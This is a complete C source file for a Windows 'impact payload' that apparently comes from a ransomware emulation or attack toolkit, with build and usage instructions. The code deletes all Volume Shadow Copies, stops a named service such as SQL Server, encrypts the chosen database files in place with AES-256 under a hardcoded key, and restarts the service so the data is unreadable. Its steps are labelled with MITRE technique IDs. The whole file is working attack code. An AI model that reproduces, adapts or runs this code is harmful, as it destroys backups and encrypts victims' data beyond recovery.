/*
 * impact.c - Phase 5 Step 1 consolidated impact payload (Phase 1: functional)
 *
 * Build (x64 Developer Command Prompt):
 *   cl /O2 /MT /W4 impact.c aes.c /Fe:impact.exe /link advapi32.lib ole32.lib
 *
 * Usage:
 *   impact.exe --target <dir> --service <name> --files <f1,f2,...>
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <stdio.h>
#include <string.h>
#include "aes.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")

/* ================================================================
 * VSS COM type definitions (C-compatible, from vss.h / vsbackup.h)
 * ================================================================ */

typedef enum {
    VSS_OBJECT_UNKNOWN      = 0,
    VSS_OBJECT_NONE         = 1,
    VSS_OBJECT_SNAPSHOT_SET = 2,
    VSS_OBJECT_SNAPSHOT     = 3,
    VSS_OBJECT_PROVIDER     = 4
} VSS_OBJECT_TYPE_E;

typedef struct {
    GUID     m_SnapshotId;
    GUID     m_SnapshotSetId;
    LONG     m_lSnapshotsCount;
    WCHAR   *m_pwszSnapshotDeviceObject;
    WCHAR   *m_pwszOriginalVolumeName;
    WCHAR   *m_pwszOriginatingMachine;
    WCHAR   *m_pwszServiceMachine;
    WCHAR   *m_pwszExposedName;
    WCHAR   *m_pwszExposedPath;
    GUID     m_ProviderId;
    LONG     m_lSnapshotAttributes;
    LONGLONG m_tsCreationTimestamp;
    int      m_eStatus;
} VSS_SNAPSHOT_PROP;

typedef struct {
    GUID    m_ProviderId;
    WCHAR  *m_pwszProviderName;
    int     m_eProviderType;
    WCHAR  *m_pwszProviderVersion;
    GUID    m_ProviderVersionId;
    GUID    m_ClassId;
} VSS_PROVIDER_PROP;

typedef struct {
    int /* VSS_OBJECT_TYPE */ Type;
    union {
        VSS_SNAPSHOT_PROP  Snap;
        VSS_PROVIDER_PROP  Prov;
    } Obj;
} VSS_OBJECT_PROP;

/*
 * IVssBackupComponents vtable indices.
 * Derived from the declaration order in vsbackup.h (SDK 10.0.26100.0).
 * IUnknown occupies [0..2], IVssBackupComponents methods follow at [3..50].
 */
#define IVBC_RELEASE           2
#define IVBC_INITFORBACKUP     5
#define IVBC_SETBACKUPSTATE    6
#define IVBC_SETCONTEXT       35
#define IVBC_DELETESNAPSHOTS  39
#define IVBC_QUERY            43

/* IVssEnumObject: IUnknown [0..2], Next [3], Skip [4], Reset [5], Clone [6] */
#define IVEO_RELEASE  2
#define IVEO_NEXT     3

#define VTBL(obj) (*(void ***)(obj))

typedef ULONG   (STDMETHODCALLTYPE *PFN_Release)(void *);
typedef HRESULT (STDMETHODCALLTYPE *PFN_InitForBackup)(void *, void *);
typedef HRESULT (STDMETHODCALLTYPE *PFN_SetBackupState)(void *, int, int, int, int);
typedef HRESULT (STDMETHODCALLTYPE *PFN_SetContext)(void *, LONG);
typedef HRESULT (STDMETHODCALLTYPE *PFN_DeleteSnapshots)(void *, GUID, int, BOOL, LONG *, GUID *);
typedef HRESULT (STDMETHODCALLTYPE *PFN_Query)(void *, GUID, int, int, void **);
typedef HRESULT (STDMETHODCALLTYPE *PFN_EnumNext)(void *, ULONG, VSS_OBJECT_PROP *, ULONG *);

typedef HRESULT (STDAPICALLTYPE *PFN_CreateVssBC)(void **);
typedef void    (APIENTRY       *PFN_VssFreeSnapProps)(VSS_SNAPSHOT_PROP *);

/* ================================================================
 * Globals
 * ================================================================ */

static WCHAR  g_targetDir[MAX_PATH];
static WCHAR  g_serviceName[256];
static WCHAR *g_files[16];
static int    g_fileCount;

static const BYTE g_key[32] = {
    82,97,110,115,111,109,71,114,112,50,48,50,53,33,64,35,
    36,37,94,38,42,40,41,95,43,61,123,124,125,58,59,34
};

static const BYTE g_iv[16] = {
    73,73,83,48,49,69,110,99,73,86,50,48,50,53,33,64
};

/* ================================================================
 * 1. VSS shadow deletion (T1490)
 * ================================================================ */

static int delete_vss_shadows(void)
{
    HRESULT hr;
    HMODULE hVssApi             = NULL;
    PFN_CreateVssBC  pCreate    = NULL;
    PFN_VssFreeSnapProps pFree  = NULL;
    void *pBC                   = NULL;
    void *pEnum                 = NULL;
    GUID  zeroGuid;
    int   total = 0;
    int   ret   = 0;

    memset(&zeroGuid, 0, sizeof(zeroGuid));

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[-] CoInitializeEx: 0x%08lX\n", hr);
        return 1;
    }

    hVssApi = LoadLibraryW(L"vssapi.dll");
    if (!hVssApi) {
        printf("[-] LoadLibrary vssapi.dll: %lu\n", GetLastError());
        ret = 1;
        goto done;
    }

    pCreate = (PFN_CreateVssBC)GetProcAddress(hVssApi,
                  "CreateVssBackupComponentsInternal");
    if (!pCreate) {
        printf("[-] CreateVssBackupComponentsInternal not exported\n");
        ret = 1;
        goto done;
    }
    pFree = (PFN_VssFreeSnapProps)GetProcAddress(hVssApi,
                "VssFreeSnapshotPropertiesInternal");

    hr = pCreate(&pBC);
    if (FAILED(hr)) {
        printf("[-] CreateVssBackupComponents: 0x%08lX\n", hr);
        ret = 1;
        goto done;
    }

    hr = ((PFN_InitForBackup)VTBL(pBC)[IVBC_INITFORBACKUP])(pBC, NULL);
    if (FAILED(hr)) {
        printf("[-] InitializeForBackup: 0x%08lX\n", hr);
        ret = 1;
        goto cleanup_bc;
    }

    /* SetBackupState(selectComponents=false, bootableState=true,
                      backupType=VSS_BT_FULL(1), partialFile=false) */
    hr = ((PFN_SetBackupState)VTBL(pBC)[IVBC_SETBACKUPSTATE])(pBC, 0, 1, 1, 0);
    if (FAILED(hr)) {
        printf("[-] SetBackupState: 0x%08lX\n", hr);
        ret = 1;
        goto cleanup_bc;
    }

    /* VSS_CTX_ALL = 0xFFFFFFFF — query all shadow copy types */
    ((PFN_SetContext)VTBL(pBC)[IVBC_SETCONTEXT])(pBC, (LONG)-1);

    hr = ((PFN_Query)VTBL(pBC)[IVBC_QUERY])(
            pBC, zeroGuid,
            (int)VSS_OBJECT_NONE, (int)VSS_OBJECT_SNAPSHOT, &pEnum);
    if (FAILED(hr)) {
        printf("[-] Query: 0x%08lX\n", hr);
        ret = 1;
        goto cleanup_bc;
    }

    if (pEnum) {
        VSS_OBJECT_PROP prop;
        ULONG fetched = 0;

        while (((PFN_EnumNext)VTBL(pEnum)[IVEO_NEXT])(pEnum, 1, &prop, &fetched)
                   == S_OK && fetched > 0)
        {
            LONG    deleted = 0;
            GUID    nonDel;
            memset(&nonDel, 0, sizeof(nonDel));

            hr = ((PFN_DeleteSnapshots)VTBL(pBC)[IVBC_DELETESNAPSHOTS])(
                    pBC, prop.Obj.Snap.m_SnapshotId,
                    (int)VSS_OBJECT_SNAPSHOT, TRUE, &deleted, &nonDel);
            if (SUCCEEDED(hr))
                total += deleted;

            if (pFree)
                pFree(&prop.Obj.Snap);

            fetched = 0;
        }

        ((PFN_Release)VTBL(pEnum)[IVEO_RELEASE])(pEnum);
    }

cleanup_bc:
    ((PFN_Release)VTBL(pBC)[IVBC_RELEASE])(pBC);

done:
    if (hVssApi) FreeLibrary(hVssApi);
    CoUninitialize();

    if (ret == 0) {
        if (total > 0)
            printf("[+] VSS: %d shadow copies deleted\n", total);
        else
            printf("[+] VSS: no shadow copies found\n");
    }
    return ret;
}

/* ================================================================
 * 2. Service stop (T1489)
 * ================================================================ */

static int stop_service(const WCHAR *name)
{
    SC_HANDLE hSCM, hSvc;
    SERVICE_STATUS ss;
    int attempts = 0;

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        printf("[-] OpenSCManager: %lu\n", GetLastError());
        return 1;
    }

    hSvc = OpenServiceW(hSCM, name, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[-] OpenService(%ls): %lu\n", name, GetLastError());
        CloseServiceHandle(hSCM);
        return 1;
    }

    if (!ControlService(hSvc, SERVICE_CONTROL_STOP, &ss)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE) {
            printf("[+] %ls: already stopped\n", name);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            return 0;
        }
        printf("[-] ControlService STOP: %lu\n", err);
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSCM);
        return 1;
    }

    while (ss.dwCurrentState != SERVICE_STOPPED && attempts < 30) {
        Sleep(1000);
        if (!QueryServiceStatus(hSvc, &ss))
            break;
        attempts++;
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    if (ss.dwCurrentState == SERVICE_STOPPED) {
        printf("[+] %ls: stopped\n", name);
        return 0;
    }
    printf("[-] %ls: stop timeout\n", name);
    return 1;
}

/* ================================================================
 * 3. AES-256-CBC file encryption via memory-mapped I/O (T1486)
 * ================================================================ */

static int encrypt_file(const WCHAR *path)
{
    HANDLE hFile, hMap;
    BYTE  *pView;
    LARGE_INTEGER li;
    size_t origSize, padLen, paddedSize;
    struct AES_ctx ctx;

    hFile = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Open %ls: %lu\n", path, GetLastError());
        return 1;
    }

    if (!GetFileSizeEx(hFile, &li) || li.QuadPart == 0) {
        printf("[-] %ls: empty or size error\n", path);
        CloseHandle(hFile);
        return 1;
    }

    origSize   = (size_t)li.QuadPart;
    padLen     = AES_BLOCKLEN - (origSize % AES_BLOCKLEN);
    paddedSize = origSize + padLen;

    hMap = CreateFileMappingW(hFile, NULL, PAGE_READWRITE,
                              (DWORD)(paddedSize >> 32),
                              (DWORD)(paddedSize & 0xFFFFFFFF), NULL);
    if (!hMap) {
        printf("[-] CreateFileMapping %ls: %lu\n", path, GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    pView = (BYTE *)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, paddedSize);
    if (!pView) {
        printf("[-] MapViewOfFile %ls: %lu\n", path, GetLastError());
        CloseHandle(hMap);
        CloseHandle(hFile);
        return 1;
    }

    /* PKCS7 padding */
    memset(pView + origSize, (int)padLen, padLen);

    AES_init_ctx_iv(&ctx, g_key, g_iv);
    AES_CBC_encrypt_buffer(&ctx, pView, paddedSize);

    FlushViewOfFile(pView, paddedSize);
    UnmapViewOfFile(pView);
    CloseHandle(hMap);
    CloseHandle(hFile);

    printf("[+] Encrypted %ls (%zu -> %zu bytes)\n", path, origSize, paddedSize);
    return 0;
}

/* ================================================================
 * 4. Service start (post-encryption)
 * ================================================================ */

static int start_service(const WCHAR *name)
{
    SC_HANDLE hSCM, hSvc;
    SERVICE_STATUS ss = {0};
    int attempts = 0;

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        printf("[-] OpenSCManager: %lu\n", GetLastError());
        return 1;
    }

    hSvc = OpenServiceW(hSCM, name, SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[-] OpenService(%ls): %lu\n", name, GetLastError());
        CloseServiceHandle(hSCM);
        return 1;
    }

    if (!StartServiceW(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[+] %ls: already running\n", name);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            return 0;
        }
        printf("[-] StartService: %lu\n", err);
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSCM);
        return 1;
    }

    while (attempts < 30) {
        if (!QueryServiceStatus(hSvc, &ss))
            break;
        if (ss.dwCurrentState == SERVICE_RUNNING)
            break;
        Sleep(1000);
        attempts++;
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    if (ss.dwCurrentState == SERVICE_RUNNING) {
        printf("[+] %ls: started\n", name);
        return 0;
    }
    printf("[-] %ls: start timeout\n", name);
    return 1;
}

/* ================================================================
 * CLI
 * ================================================================ */

static void usage(void)
{
    printf("Usage: impact.exe --target <dir> --service <name> --files <f1,f2,...>\n");
}

static int parse_args(int argc, WCHAR **argv)
{
    int i;
    for (i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--target") == 0 && i + 1 < argc)
            wcscpy_s(g_targetDir, MAX_PATH, argv[++i]);
        else if (wcscmp(argv[i], L"--service") == 0 && i + 1 < argc)
            wcscpy_s(g_serviceName, 256, argv[++i]);
        else if (wcscmp(argv[i], L"--files") == 0 && i + 1 < argc) {
            WCHAR *list = argv[++i];
            WCHAR *ctx  = NULL;
            WCHAR *tok  = wcstok_s(list, L",", &ctx);
            while (tok && g_fileCount < 16) {
                g_files[g_fileCount++] = tok;
                tok = wcstok_s(NULL, L",", &ctx);
            }
        } else {
            usage();
            return 1;
        }
    }

    if (!g_targetDir[0] || !g_serviceName[0] || g_fileCount == 0) {
        usage();
        return 1;
    }
    return 0;
}

/* ================================================================
 * Entry point
 * ================================================================ */

int wmain(int argc, WCHAR **argv)
{
    int i, rc;

    if (parse_args(argc, argv) != 0)
        return 1;

    /* T1490 — delete all VSS shadow copies */
    rc = delete_vss_shadows();
    if (rc != 0)
        printf("[-] VSS deletion failed, continuing\n");

    /* T1489 — stop target service to release file locks */
    rc = stop_service(g_serviceName);
    if (rc != 0)
        return 1;

    /* T1486 — AES-256-CBC encrypt each target file in-place */
    for (i = 0; i < g_fileCount; i++) {
        WCHAR fullPath[MAX_PATH];
        _snwprintf_s(fullPath, MAX_PATH, _TRUNCATE,
                     L"%s\\%s", g_targetDir, g_files[i]);
        if (encrypt_file(fullPath) != 0)
            return 1;
    }

    /* restart service — SQL Server will fail to read encrypted MDF */
    rc = start_service(g_serviceName);
    if (rc != 0)
        return 1;

    printf("[+] Impact chain complete\n");
    return 0;
}
